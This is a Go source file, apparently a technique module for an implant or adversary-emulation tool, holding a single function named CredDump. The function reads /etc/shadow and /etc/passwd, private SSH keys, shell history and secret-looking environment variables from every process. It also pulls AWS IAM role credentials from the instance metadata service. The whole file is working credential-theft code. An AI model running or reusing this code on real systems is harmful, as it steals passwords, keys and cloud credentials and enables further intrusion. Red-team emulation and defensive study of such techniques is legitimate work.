package ttp

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// CredDump collects credential material from the system.
func CredDump() (string, error) {
	var sb strings.Builder

	// /etc/shadow
	if data, err := os.ReadFile("/etc/shadow"); err == nil {
		sb.WriteString("=== /etc/shadow ===\n")
		sb.Write(data)
		sb.WriteString("\n")
	} else {
		sb.WriteString(fmt.Sprintf("=== /etc/shadow === (denied: %v)\n\n", err))
	}

	// /etc/passwd
	if data, err := os.ReadFile("/etc/passwd"); err == nil {
		sb.WriteString("=== /etc/passwd ===\n")
		sb.Write(data)
		sb.WriteString("\n")
	}

	// SSH private keys
	sb.WriteString("=== SSH keys ===\n")
	searchDirs := []string{"/root"}
	if home, err := os.ReadDir("/home"); err == nil {
		for _, e := range home {
			searchDirs = append(searchDirs, filepath.Join("/home", e.Name()))
		}
	}
	for _, dir := range searchDirs {
		sshDir := filepath.Join(dir, ".ssh")
		keys, _ := filepath.Glob(filepath.Join(sshDir, "id_*"))
		for _, kf := range keys {
			if strings.HasSuffix(kf, ".pub") {
				continue
			}
			if data, err := os.ReadFile(kf); err == nil {
				sb.WriteString(fmt.Sprintf("--- %s ---\n", kf))
				sb.Write(data)
				sb.WriteString("\n")
			}
		}
		if data, err := os.ReadFile(filepath.Join(sshDir, "authorized_keys")); err == nil {
			sb.WriteString(fmt.Sprintf("--- %s/.ssh/authorized_keys ---\n", dir))
			sb.Write(data)
			sb.WriteString("\n")
		}
	}

	// Shell history (last 50 lines)
	sb.WriteString("=== Shell history ===\n")
	var histFiles []string
	for _, dir := range searchDirs {
		histFiles = append(histFiles,
			filepath.Join(dir, ".bash_history"),
			filepath.Join(dir, ".zsh_history"),
		)
	}
	for _, hf := range histFiles {
		if data, err := os.ReadFile(hf); err == nil {
			lines := strings.Split(strings.TrimSpace(string(data)), "\n")
			if len(lines) > 50 {
				lines = lines[len(lines)-50:]
			}
			sb.WriteString(fmt.Sprintf("--- %s ---\n", hf))
			sb.WriteString(strings.Join(lines, "\n"))
			sb.WriteString("\n\n")
		}
	}

	// Environment scan for secrets
	sb.WriteString("=== Environment secrets ===\n")
	patterns := []string{"KEY", "SECRET", "TOKEN", "PASS", "PWD", "API", "CRED"}
	procEntries, _ := os.ReadDir("/proc")
	found := 0
	for _, pe := range procEntries {
		if !pe.IsDir() {
			continue
		}
		data, err := os.ReadFile(filepath.Join("/proc", pe.Name(), "environ"))
		if err != nil {
			continue
		}
		for _, v := range strings.Split(string(data), "\x00") {
			upper := strings.ToUpper(v)
			for _, p := range patterns {
				if strings.Contains(upper, p) {
					sb.WriteString(fmt.Sprintf("pid=%-6s %s\n", pe.Name(), v))
					found++
					break
				}
			}
		}
		if found > 100 {
			break
		}
	}
	if found == 0 {
		sb.WriteString("(none found)\n")
	}

	// AWS IMDS
	sb.WriteString("\n=== AWS IMDS ===\n")
	out, err := exec.Command("curl", "-s", "--connect-timeout", "2",
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/").Output()
	if err == nil && len(out) > 0 {
		role := strings.TrimSpace(string(out))
		sb.WriteString(fmt.Sprintf("role: %s\n", role))
		if role != "" {
			creds, _ := exec.Command("curl", "-s", "--connect-timeout", "2",
				fmt.Sprintf("http://169.254.169.254/latest/meta-data/iam/security-credentials/%s", role),
			).Output()
			if len(creds) > 0 {
				sb.Write(creds)
				sb.WriteString("\n")
			}
		}
	} else {
		sb.WriteString("(not AWS or IMDS blocked)\n")
	}

	result := sb.String()
	if len(result) > 8192 {
		result = result[:8192] + "\n...(truncated)"
	}
	return result, nil
}
